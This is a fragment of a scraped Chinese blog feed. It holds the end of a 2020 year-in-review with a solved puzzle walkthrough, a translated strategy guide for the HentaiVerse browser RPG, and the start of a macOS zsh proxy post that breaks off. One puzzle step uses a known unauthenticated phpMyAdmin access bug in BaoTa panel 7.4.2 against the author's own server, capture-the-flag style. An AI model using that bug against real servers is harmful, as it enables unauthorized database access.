<a href=\"https://wordpress.org/plugins/wp-webauthn/\">WordPress 插件目录</a>\n</li>\n<li>四月：Cytus II 主线大结局<del>，我当场通关 </del>\n</li>\n<li>五月：开始学车</li>\n<li>五月：MDx 达到 500 Stars</li>\n<li>七月：第一次实习，公司的前端技术栈和我熟悉的完全一致<del>，于是愉快地在公司里写了一个半月的各种表格 </del>\n</li>\n<li>八月：实习结束，部门同事都很棒，确实学到了很多</li>\n<li>九月：和 Ralph 面基一整天</li>\n<li>九月：入手树莓派 4B</li>\n<li>十月：搬家</li>\n<li>十月：和宁诺合作的 H5 上线</li>\n<li>十一月：TEDxNingbo 年度大会，H5 上线<del>，持续摸鱼中 </del>\n</li>\n<li>十一月：终于买了块副屏，<del> 秃头 </del>写代码更快乐了</li>\n<li>十二月：MDx 喜提 600 Stars</li>\n</ul>\n<h1>跨年红包</h1>\n<p><del>传统艺能时间！和以前一样，红包不是白拿的，你需要一点点技术力来解密拿到红包。有效期截至 2021 年 1 月 1 日 22 时。</del></p>\n<p>今年的解谜旅程，从下面这段颜文字开始。</p>\n<pre>ﾟωﾟﾉ= /｀ｍ´）ﾉ ~┻━┻   //*´∇｀*/ ['_']; o=(ﾟｰﾟ)  =_=3; c=(ﾟΘﾟ) =(ﾟｰﾟ)-(ﾟｰﾟ); (ﾟДﾟ) =(ﾟΘﾟ)= (o^_^o)/ (o^_^o);(ﾟДﾟ)={ﾟΘﾟ: '_' ,ﾟωﾟﾉ : ((ﾟωﾟﾉ==3) +'_') [ﾟΘﾟ] ,ﾟｰﾟﾉ :(ﾟωﾟﾉ+ '_')[o^_^o -(ﾟΘﾟ)] ,ﾟДﾟﾉ:((ﾟｰﾟ==3) +'_')[ﾟｰﾟ] }; (ﾟДﾟ) [ﾟΘﾟ] =((ﾟωﾟﾉ==3) +'_') [c^_^o];(ﾟДﾟ) ['c'] = ((ﾟДﾟ)+'_') [ (ﾟｰﾟ)+(ﾟｰﾟ)-(ﾟΘﾟ) ];(ﾟДﾟ) ['o'] = ((ﾟДﾟ)+'_') [ﾟΘﾟ];(ﾟoﾟ)=(ﾟДﾟ) ['c']+(ﾟДﾟ) ['o']+(ﾟωﾟﾉ +'_')[ﾟΘﾟ]+ ((ﾟωﾟﾉ==3) +'_') [ﾟｰﾟ] + ((ﾟДﾟ) +'_') [(ﾟｰﾟ)+(ﾟｰﾟ)]+ ((ﾟｰﾟ==3) +'_') [ﾟΘﾟ]+((ﾟｰﾟ==3) +'_') [(ﾟｰﾟ) - (ﾟΘﾟ)]+(ﾟДﾟ) ['c']+((ﾟДﾟ)+'_') [(ﾟｰﾟ)+(ﾟｰﾟ)]+ (ﾟДﾟ) ['o']+((ﾟｰﾟ==3) +'_') [ﾟΘﾟ];(ﾟДﾟ) ['_'] =(o^_^o) [ﾟoﾟ] [ﾟoﾟ];(ﾟεﾟ)=((ﾟｰﾟ==3) +'_') [ﾟΘﾟ]+ (ﾟДﾟ) .ﾟДﾟﾉ+((ﾟДﾟ)+'_') [(ﾟｰﾟ) + (ﾟｰﾟ)]+((ﾟｰﾟ==3) +'_') [o^_^o -ﾟΘﾟ]+((ﾟｰﾟ==3) +'_') [ﾟΘﾟ]+ (ﾟωﾟﾉ +'_') [ﾟΘﾟ]; (ﾟｰﾟ)+=(ﾟΘﾟ); (ﾟДﾟ)[ﾟεﾟ]='\\\\'; (ﾟДﾟ).ﾟΘﾟﾉ=(ﾟДﾟ+ ﾟｰﾟ)[o^_^o -(ﾟΘﾟ)];(oﾟｰﾟo)=(ﾟωﾟﾉ +'_')[c^_^o];(ﾟДﾟ) [ﾟoﾟ]='\\\"';(ﾟДﾟ) ['_'] ( (ﾟДﾟ) ['_'] (ﾟεﾟ+(ﾟДﾟ)[ﾟoﾟ]+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (o^_^o))+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟoﾟ]) (ﾟΘﾟ)) ('_')</pre>\n<p><del>和去年一样，红包限时不限量。</del>为了保持解谜乐趣，请不要将答案透露给他人，也请不要重复领取红包，否则视情况活动可能会提前结束。</p>\n<p>由于出现大量重复领取/未解题即领取红包的现象，红包解谜活动立即结束，当前红包领完后将不再更新新的红包口令码。<strong>我发起红包解谜活动是为了解题的乐趣而不是发钱，请各位理解。</strong>以下是详细信息。</p>\n<p>出于对参与者的信任，今年的题目中没有对参与者是否已完成前序步骤进行任何验证，但在最后的 WebSocket 中我记录下了所有成功连接的 IP。今年共发出了 32 个红包，但最后一个步骤的日志只记录到了 25 个不重复 IP（鉴于第一批 10 个红包领完时只记录到了四个 IP，实际人数应该小于 25）。查阅支付宝的红包领取记录可以发现有多位用户多次领取了红包，还有一些用户疑似是从他人处获取答案并直接领取的。鉴于活动已经完全失去意义，我选择提前结束了红包解谜活动。</p>\n<h2>红包答案</h2>\n<p>现在，让我们来看看答案吧。今年的题目难度不高，由于事情比较多，我的准备时间确实不多。</p>\n<p>第一阶段非常简单，这段颜文字就是 Javascript，只是使用了著名的 aaencode 将其编码为了颜文字<del>（多亏了 js 优秀的自动类型转换）</del>。将这段颜文字扔进浏览器控制台即可得到 <code>https://rp.dlij.site/2021/</code>。</p>\n<p>前往这个 URL，可以看到这张图。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/index.png\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/index.png\" alt=\"\" width=\"2000\" height=\"1125\" class=\"aligncenter size-full wp-image-2444\"></a>\n<p>今年八月宝塔面板 7.4.2 的 phpMyAdmin 未授权访问漏洞很多人都知道了，如果你不清楚，搜索“宝塔面板 7.4.2”也能找到相关信息。首先找到 <code>rp.dlij.site</code> 对应的 IP 是 <code>121.196.27.125</code>，访问 <code>http://121.196.27.125:888/pma</code> 即可看到一个 phpMyAdmin 的界面（为了把这个页面扒下来我还装了一个真的宝塔面板…）。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/pma.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/pma.jpg\" alt=\"\" width=\"1600\" height=\"867\" class=\"aligncenter size-full wp-image-2448\"></a>\n<p>可以看到信息是 <code>7972632E6D652F6738546D444A3132</code>。和前年一样，这其实是十六进制的 ASCII 码，每两位转为 ASCII 字符即可得到 <code>yrc.me/g8TmDJ12</code>。访问这个页面，可以看到如下信息。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/apl.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/apl.jpg\" alt=\"\" width=\"1500\" height=\"248\" class=\"aligncenter size-full wp-image-2447\"></a>\n<p>这是 APL，一种有趣的函数式编程语言。你可能不了解它，但只要你搜索网页的 <code>title</code>，就能找到这个在线运行 APL 的页面：<a href=\"https://tryapl.org/\">TryAPL</a>。在这个页面中粘贴这段代码，即可得到 <code>https://rp.dlij.site/2021/2554038.75</code>。访问这个 URL，可以看到一张图。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/2021-b.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/2021-b.jpg\" alt=\"\" width=\"720\" height=\"960\" class=\"aligncenter size-full wp-image-2445\"></a>\n<p>连续三年的传统艺能了，压缩包藏在了图片里。下载图片，将后缀改为 .zip 然后打开，可以看到一个 README.md。其中要求我们去 <code>ws://121.196.27.125:8080/NvAhoZ9@H2Au</code> 获取最终红包口令码。这是一个 WebSocket 协议的地址，在浏览器中开一个新 Console，执行 <code>new WebSocket('ws://121.196.27.125:8080/NvAhoZ9@H2Au')</code> 即可在 Network 选项卡中看见服务器下发的红包口令码。当然，别忘了将其反转。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/message.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/message.jpg\" alt=\"\" width=\"475\" height=\"179\" class=\"aligncenter size-full wp-image-2446\"></a>\n<h1>跨年海报</h1>\n<p>依然是传统艺能，今年的海报只用到了 PS。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/2021.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/2021.jpg\" alt=\"2021\" width=\"720\" height=\"960\" class=\"aligncenter size-full wp-image-2407\"></a>\n<p>提前祝各位新年快乐！</p>\n","link":"https://flyhigher.top/diary/2405.html"},{"title":"[译] HentaiVerse 建议和指导","date":"2020-12-24 22:31:00","description":"\n<p>著名的同人本资源集散地 E-hentai 有一个完全没有人在意的角落 ——「HentaiVerse」，一个纯文字网页 RPG 游戏。虽然这个游戏应该不会有太多新玩家了，不过还是翻译一篇给新玩家的指导文吧。</p>\n<span></span><blockquote><p>原文标题：HentaiVerse Advice<br>原文作者：<a href=\"https://ehwiki.org/action/history/Talk:HentaiVerse_Advice\">作者列表</a><br>原文链接：<a href=\"https://ehwiki.org/wiki/HentaiVerse_Advice\">https://ehwiki.org/wiki/HentaiVerse_Advice</a><br>原文授权协议：GNU Free Documentation License 1.2+<br>本文由 <a href=\"https://skk.moe/\">Sukka</a> 翻译，首发于 <a href=\"https://blog.skk.moe/\">Sukka’s Blog</a></p></blockquote>\n<h2>译者的话</h2>\n<ul>\n<li>本文不是 HentaiVerse 新手教程文。想入新手村请左转百度贴吧「HV 网页游戏吧」置顶帖、右转 E-hentai 社区<a href=\"https://forums.e-hentai.org/index.php?showtopic=189266\">「中文指引」帖</a>。</li>\n<li>本文假设你对 HentaiVerse 有一定程度的了解。如果你不满足这个前提，请先去阅读 <a href=\"https://ehwiki.org/\">EHWiki</a>。</li>\n<li>本文的作者都是 E-hentai 社区中受人敬仰的资深玩家、亦或是 E-hentai 社区 HentaiVerse 版块的管理员，但毫无疑问这并非你唯一的玩法选择，译者本人的玩法风格就与本文的建议背道而驰（截至本文译就，译者为 360 级，装备搭配是 西洋 + 超高格挡圆盾 + 全身轻甲）。</li>\n<li>HentaiVerse 带来的收益其实很有限，尤其是当你要解锁 HentaiVerse 相关的 Hath Perks 时。不过如果你是为了赚 Credit 和 GP 才来玩 HentaiVerse 的话，之后你也不会有心思看本子的。</li>\n</ul>\n<h2>路线指导</h2>\n<h3>50 级之前</h3>\n<p>在这个阶段，你完全不必在意选择 <a href=\"https://ehwiki.org/wiki/Play_Styles/Chinese\">战士或法师</a>，也不必在乎 <a href=\"https://ehwiki.org/wiki/Fighting_Styles/Chinese\">战斗风格</a>。保持你的主属性均衡分布（译者注：即中文玩家圈口中的「水桶加点」）。此时游戏的难度和花费都是微不足道的，你可以试一试每一种玩法和风格。</p>\n<h3>51 级到 199 级</h3>\n<p>200 级以前推荐走战士的路线。<a href=\"https://ehwiki.org/wiki/Fighting_Styles#Two-Handed\">双手武器</a> + <a href=\"https://ehwiki.org/wiki/armor\">轻甲</a> 是个不错的选择，使用西洋剑和盾牌的 <a href=\"https://ehwiki.org/wiki/Fighting_Styles#One-Handed\">单手</a> 风格也值得一试。这两种玩法可以提供最佳的生存可能，因此你可以提前尝试更高的 <a href=\"https://ehwiki.org/wiki/difficulties\">难度</a>，而更高的难度意味着更好的掉落。</p>\n<p>不建议这个阶段的玩家尝试法师，因为法师是一种游走在边缘的危险玩法，如果你没有很好的装备和咒语，那么很大几率你在杀死敌人之前会先被敌人干掉。这并不是说你不能选择法师，但是你很难在更高的难度下通关。</p>\n<p>继续维持主属性均衡分布，INT 除外（译者注，一般推荐 INT 值为当前等级的 60% 到 70%，以保证足够的 SP 值用于维持灵动架势）。每 30 级左右就更换一次装备，考虑到你现在用的装备都不推荐魂绑，所以使用和你等级接近的装备显然更合适。</p>\n<h3>200 级到 319 级</h3>\n<p>怪物会因为可以使用灵力攻击而变得更强大。在这个阶段，建议用西洋剑玩单手盾战风格，西洋剑的后缀应该是「杀戮」或「平衡」，盾牌的类型则推荐力场盾、不过最关键的是盾牌的「格挡率」越高越好。这个阶段推荐使用重甲，最好是带有 Power 前缀的。「杀戮」后缀的重甲减伤一般而伤害加成更高，价格也更贵。</p>\n<p>此时仍然不推荐法师风格，因为 310 级以前你没法点满「Faster Imperil」。除非你的装备非常好，否则你必须要大量使用「Imperil」技能，而这个等级下的装备是非常昂贵的。</p>\n<h3>320 级以上</h3>\n<p>法师突然变成一个非常可行的选择。杀戮后缀的西洋剑 + 立场盾 + Power 前缀杀戮后缀重甲 也很不错。法师装备更贵、依赖 Supportive 咒语生存，但是清关的速度更快（译者注：法师清关龙场一般不会超过 2000 turn、但盾战需要至少 8000 turn）。</p>\n<h2>风格指导</h2>\n<h3>法师</h3>\n<ul>\n<li>只使用布甲和法杖</li>\n<li>法师可以施放除「虚空伤害」以外的所有伤害类型的法术</li>\n<li>可以对一片怪物造成伤害</li>\n<li>可以借助元素爆炸的优势</li>\n<li>0 干扰、极低的负重，因此魔法消耗和行动速度很快</li>\n<li>缓伤效果较差</li>\n</ul>\n<h3>战士</h3>\n<p>不论你是哪一种战士，友情小马炮永远是你最好的朋友。</p>\n<h4>轻甲</h4>\n<ul>\n<li>中等水平的缓伤、干扰、负重，低穿刺缓伤、低回避率</li>\n<li>暗影类轻甲可以提供更高的伤害加成，0 干扰，相对更高的回避率，但缓伤较低、完全不能免疫穿刺伤害</li>\n</ul>\n<h4>重甲</h4>\n<ul>\n<li>最高的缓伤效果，但是干扰和负重也最高</li>\n<li>Power 前缀的动力甲可以提供不错的伤害加成</li>\n</ul>\n<h4>单手</h4>\n<ul>\n<li>搭配盾牌可以带来不错的格挡率加成，有效提升生存率</li>\n<li>「压倒性的攻击」技能可以增加伤害、命中率和招架率</li>\n<li>反击可以增加斗气，让你可以频繁地使用「Fighting Skills」和保持住「灵动架势」</li>\n</ul>\n<h4>双持</h4>\n<ul>\n<li>对单个目标的伤害最高，适合浴血擂台（Ring of Blood）和传奇竞技场</li>\n<li>可以打出两个效果（如同时打出「眩晕」和「刺甲」）</li>\n<li>三阶段「Fighting Skills」可以击中多个目标</li>\n<li>由于没有盾牌、格挡率加成极低，只能靠回避率和招架率生存</li>\n<li>攻击速度和命中率极高，但生存率很一般</li>\n</ul>\n<h4>双手</h4>\n<ul>\n<li>「Domino Strike」可以命中多个目标</li>\n<li>易于同时攻击多个目标</li>\n</ul>\n<h4>二天一流</h4>\n<ul>\n<li>搭配日本刀 + 胁差的玩法风格</li>\n<li>同时拥有部分双手和双持的优势</li>\n<li>「Domino Strike」只能命中不超过 5 个目标</li>\n<li>副手没有招架加成</li>\n<li>适合 100 级以下的玩家或 300 级以上的玩家</li>\n</ul>\n<h2>培养方向</h2>\n<h3>技能点</h3>\n<p>这一节的内容适用于所有风格，不论是法师、战士还是战法师。</p>\n<p>不要把技能点浪费在你不主动使用的能力上（比如你是一名元素法师，就不应该加圣、暗的技能），技能只有在装配在支配槽中才会起作用。在低等级时你升级获得的技能点会远比你需要的多，但是到 200 级以后你的技能点就会不够用了。你需要通过 <a href=\"https://ehwiki.org/wiki/training\">训练</a>「Ability Boost」来获得更多的技能点。</p>\n<h4>应该加的技能</h4>\n<ul>\n<li>HP Tank（非常重要）：血条，直接决定你的生存几率</li>\n<li>MP Tank（非常重要）：蓝条，非常有用</li>\n<li>Better Cure（非常重要）：减少冷却时间、增加治疗的 HP 量。在 HentaiVerse 里 HP 药水效果一般，你会更依赖治疗咒语。</li>\n<li>Better Regen（非常重要）：提供更有效且更持久的回血</li>\n<li>Better Protection（非常重要）：极大地提升生存几率</li>\n<li>对应装备和战斗风格的技能（非常重要）：随着熟练度提升将有效提升你的任务属性</li>\n<li>Better Mana Pots（重要）：MP 药水是战斗必带的回复品</li>\n<li>Better Haste（重要）：增加你攻击、施法的速度，因此你可以攻击更多的怪物，有效提升你的生存几率</li>\n<li>Stronger Spirit（重要）：让灵力盾可以消耗更少的 SP、更早的抵御攻击</li>\n<li>SP Tanks（重要）：对于战士来说，这是保持灵动架势必备的。而灵力盾和生命火花也依赖 SP 才能发挥作用</li>\n<li>Better Shadow Veil：更高的回避率加成意味着更高的生存几率</li>\n<li>Better Imperil（可选）：削弱怪物的缓伤，对于法师来说是个不错的选择</li>\n<li>Faster Imperil（可选）：降低 Imperil 的消耗和冷却时间、增加受影响的目标，特别适合法师</li>\n<li>Better Spark（可选）：大部分玩家都会通过 IA 自动施放生命火花，此时只能帮助你减少 MP 消耗。一旦你升到 150 级以上，你就会经常看到带有 SP 条的怪物了，而怪物的 SP 攻击可以对你造成极大的伤害、甚至能秒杀你，而生命火花就是你的最后一道保障（译者注：「生命火花」类似于 Minecraft 的「不死图腾」）</li>\n</ul>\n<h4>不推荐的技能</h4>\n<ul>\n<li>Better Drain：造成的伤害非常有限</li>\n<li>Faster Drain：枯竭咒语本身的施法速度就够快了，而冷却时间却不会变短很多</li>\n<li>Better Absorb：很一般的咒语，大部分怪物并不会进行魔法攻击。只有在打 Boss 时会有点用</li>\n<li>Better Slow：Better MagNet 显然是个更合适的选择</li>\n<li>Mind Control：并没有什么用</li>\n<li>Better Blind 和 Faster Blind：Weaken 咒语效果更明显</li>\n<li>Ether Theft：对法师来说是多余的</li>\n</ul>\n<h3>法师哲学</h3>\n<p>法师是一种游走在边缘的职业，尝试在怪物秒杀你之前 秒杀他们。</p>\n<ul>\n<li>310 级以前不建议尝试</li>\n<li>依赖高伤害和回避率生存</li>\n<li>高投入、高回报</li>\n</ul>\n<h3>战士哲学</h3>\n<ul>\n<li>通过高缓伤和再生咒语生存，使用格挡、回避和招架防御。</li>\n<li>战士也需要 MP 维持 BUFF，必要时还要使用 DEBUFF</li>\n<li>200 级以前，尽量确保命中率高于 100%</li>\n</ul>\n<h2>难度调整</h2>\n<p>随着你的等级不断提升，你将会遇见更强大的怪物，战力大多都在 400 以上（拥有 SP 攻击的能力）。从 150 级开始难度就会显著增加，因此你应该适时做一些难度调整。</p>\n<ul>\n<li>尽量选择 Hard 以上难度，以便获得 Shard</li>\n<li>获得更好的装备（尤其是武器），数值比装备等级更重要</li>\n<li>多多使用 BUFF 和 DEBUFF</li>\n<li>第一个 IA 自动施法槽只需要 50H，非常非常非常非常划算的投资</li>\n</ul>\n<h2>装备</h2>\n<p>等级较低的玩家应该多逛逛 E-hentai 社区，领取免费装备和每周的补给（药水、卷轴等）。品质高的装备的属性不一定比品质低的装备好，因此选择和更换装备时三思而后行。</p>\n<h2>物品</h2>\n<ul>\n<li>药水是拿来喝的，不是拿来收藏的。</li>\n<li>喝药水和使用卷轴不计入 turn，所以为啥不多用用呢？</li>\n<li>长效药一般用于较长的战斗，普通药水用于应急，丹药（译者注：中文圈玩家一般称之为「大药」）是在紧急情况下、普通药水的冷却时间还没过、或想要同时获得两种效果时使用的。一些老玩家会给新玩家发放免费药水，去 E-hentai 社区 HentaiVerse 版块的 WTS 分区里看看？</li>\n<li>浴血擂台中 Flying Spaghetti Monster 是性价比最高的，其余的挑战通一次就够了。</li>\n<li>只有你自信能在 PFUDOR 难度打败 Triple Trio and the Tree 时再去刷。</li>\n</ul>\n<h2>怪物实验室</h2>\n<ul>\n<li>你想什么时候去看看就去，只需要记住怪物给予礼物的间隔至少为一小时，而且较弱的怪物一般很少给予礼物。</li>\n<li>如果一个怪物过去 3 天没有给你礼物的怪物，那么接下来他一定会给予你一个礼物。</li>\n<li>怪物的名字越有趣越好，不要用序号或者脸滚键盘为怪物取名。</li>\n</ul>\n<h2>雪花祭坛和奖杯</h2>\n<ul>\n<li>你可以通过献祭奖杯换取装备，也可以随时将它们卖掉。它们在雪花祭坛的价值不会改变，因此囤积它们没有实际意义。</li>\n<li>奖杯永远不要卖给系统店，要么献祭掉、要么卖给玩家（比系统店的价格要高得多）。</li>\n</ul>\n<h2>训练</h2>\n<p>训练会极大程度的消耗你的 Credits，并且除了 Adept Learner 和 Ability Boost 以外很难给你提供太多加成：将 Scavenger 训练满将会花费你 1700 万 Credit，但是掉落几率不过从 10% 提升到 12.5% 而已（译者注：在中文圈玩家中，四个增加掉落率的训练被称为「四大」，因为「四大皆空」）。</p>\n<h2>武器店和道具店</h2>\n<p>武器店里卖的装备要么等级太高、要么等级太低，不如在 社区 HentaiVerse 版块的 WTS 分区里直接向玩家购买。道具店里的东西一般很贵，WTS 版块里要便宜一些，但是去 <a href=\"https://hvmarket.xyz/\">HVMarket</a> 购买最划算。</p>\n<h2>熔炉</h2>\n<ul>\n<li>每项属性的前 5 次升级都不消耗站粘合剂，性价比高；而当你分解装备时，强化材料的 90% 原料都会返还给你，因此在低等级时升级装备还是相对划算的。</li>\n<li>叠加装备附魔不会增强效果，只会增加持续的时间。</li>\n<li>当你装备获得了不想要的潜能时，马上重新锻造它，因为每一级装备潜能意味着需要一片重铸碎片。</li>\n<li>除非你是土豪，否则不要购买灵魂碎片。每天打遭遇战可以获得至多 60 片灵魂碎片。</li>\n</ul>\n<div class=\"license\"> <div class=\"license-title\">[译] HentaiVerse 建议和指导</div> <div class=\"license-link\"><a href=\"https://blog.skk.moe/post/hentaiverse-advice/\">https://blog.skk.moe/post/hentaiverse-advice/</a></div> <div class=\"license-meta\"> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">本文作者</div> <div class=\"license-meta-text\">Sukka</div> </div> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">发布于</div> <div class=\"license-meta-text\">2020-12-24</div> </div>\n<div class=\"license-meta-item\"> <div class=\"license-meta-title\">许可协议</div> <div class=\"license-meta-text\"><a href=\"https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">CC BY-NC-SA 4.0</a></div> </div>\n</div>\n<div>转载或引用本文时请遵守许可协议，注明出处、不得用于商业用途！</div>\n</div>\n","link":"https://blog.skk.moe/post/hentaiverse-advice/"},{"title":"ZSH 自动读取 macOS 系统代理配置并设置环境变量","date":"2020-12-07 02:47:00","description":"\n<p>和其它 Linux 的 DE 一样，macOS 也支持在「系统偏好设置」中设置 HTTP 代理、HTTPS 代理，但是 macOS 并不会在终端（Terminal、iTerm）的 shell 中自动生效系统代理配置。为了方便日常使用，我决定好好研究一下 macOS 的系统代理。</p>\n<h2>macOS 系统代理的行为</h2>\n<p>和 Linux 和 Windows 只有一种系统代理配置不同，macOS 为每一种网络设备（Wi-Fi、Ethernet、Bluetooth PAN 等）维护了独立的网络配置，包括代理配置在内。因此当切换网络设备时，macOS 会使用不同的代理配置；如果同时连接了多个网络设备，则操作系统会优先采用在「系统偏好设置」网络「Service Order」靠上的设备的代理配置：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.3/1.png\" class=\"lazy post-img\"></p>\n<p>和大部分 Linux 桌面环境一样，系统偏好设置中的代理设置在 shell session 中是不会生效的，在终端中使用代理、需要手动提供 <code>HTTP_PROXY</code>、<code>HTTPS_PROXY</code> 和 <code>ALL_PROXY</code> 环境变量。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.3/2.png\" class=\"lazy post-img\"></p>\n<h2>在终端获取 macOS 系统代理配置</h2>\n<p>macOS 内置了许多实用的命令行工具，如 <code>xcode-select</code> 用于安装命令行工具和配置 Xcode、<code>build_webkit</code> 用于编译 WebKit、<code>softwareupdate</code> 用于获取系统更新等。在读取系统代理配置方面，macOS 提供了三种方法：</p>\n<pre><code class=\"hljs bash\">$ system_profiler SPNetworkDataType <span class=\"hljs-comment\"># 获取完整网络配置信息</span>$ networksetup -listallnetworkservices <span class=\"hljs-comment\"># 列举所有网络设备</span>$ networksetup -getwebproxy Wi-Fi <span class=\"hljs-comment\"># 获取特定网络设备的系统代理配置</span>$ scutil --proxy <span class=\"hljs-comment\"># 获取当前已启用的代理配置，是对 system_profiler 的封装</span></code></pre>\n<p>其中，第三种命令的输出最简洁，适合在 shell 中解析：</p>\n<pre><code class=\"hljs bash\">$ scutil --proxy&lt;dictionary&gt; {  ExceptionsList : &lt;array&gt; {    0 : 127.0.0.1    1 : 192.168.0.0/16    2 : 10.0.0.0/8    3 : 172.16.0.0/12    4 : 100.64.0.0/10    5 : 17.0.0.0/8    6 : localhost    7 